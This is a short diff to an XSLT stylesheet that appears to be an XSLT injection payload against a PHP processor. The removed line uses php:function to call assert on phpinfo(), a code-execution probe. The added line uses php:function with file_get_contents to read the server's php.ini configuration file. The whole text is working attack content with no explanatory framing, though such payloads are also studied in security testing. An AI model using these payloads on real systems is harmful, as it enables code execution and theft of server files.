@@ -2,7 +2,7 @@
 <xsl:template match="/">
 
 
- <xsl:value-of select="php:function('assert','phpinfo()')"/>
+ <xsl:value-of select="php:function('file_get_contents','/etc/php/7.0/fpm/php.ini')"/>
 
 </xsl:template>
 </xsl:stylesheet>
